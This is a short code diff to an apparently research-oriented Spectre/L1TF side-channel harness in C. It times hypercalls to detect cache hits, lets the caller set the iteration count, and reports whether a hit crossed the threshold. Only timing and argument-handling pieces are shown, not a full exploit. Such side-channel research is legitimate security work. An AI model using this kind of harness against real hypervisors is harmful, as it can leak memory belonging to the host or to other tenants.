@@ -52,6 +52,10 @@ size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iter
   size_t min = -1;
   for (size_t i = 0; i < iters; ++i) {
     size_t time = hypercall(&opts);
+    if (time < CACHE_HIT_THRESHOLD) {
+      return time;
+      // printf("iter %ld\ttime %ld\n", i, time);
+    }
     min = time < min ? time : min;
   }
 
@@ -147,9 +151,9 @@ void cmd_calc_min(int argc, char *argv[argc]) {
 }
 
 void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
-  if (argc <= 2) {
+  if (argc <= 3) {
     errno = EINVAL;
-    err(errno, "missing args, requires min");
+    err(errno, "missing args, requires min and iters");
   }
   char *endptr = NULL;
   uintptr_t min = strtoull(argv[2], &endptr, 16);
@@ -158,21 +162,17 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
     err(errno, "Could not parse min");
   }
 
-  printf("Reading needle...\n");
-  // char needle[128];
-  // ssize_t needle_size = read(STDIN_FILENO, needle, 128);
-  // if (needle_size <= 0) {
-  //   err(errno, "No l1tf needle");
-  // }
-  // memcpy(leak_page, needle, needle_size);
-  const size_t iterations = 1000;
+  uintptr_t iterations = strtoull(argv[3], &endptr, 10);
+  if (endptr == argv[3]) {
+    errno = EINVAL;
+    err(errno, "Could not parse iterations");
+  }
+
   printf("Doing %ld iterations\n", iterations);
   size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
   size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
 
-  printf("Miss: %ld\tHit: %ld\n", miss, hit);
-
-  // memset(leak_page, 0, needle_size);
+  printf("Mins\n\tMiss: %ld\tHit: %ld\tHit?: %s\n", miss, hit, hit < CACHE_HIT_THRESHOLD ? "YES!" : "no");
 }
 
 void pin_cpu(void) {
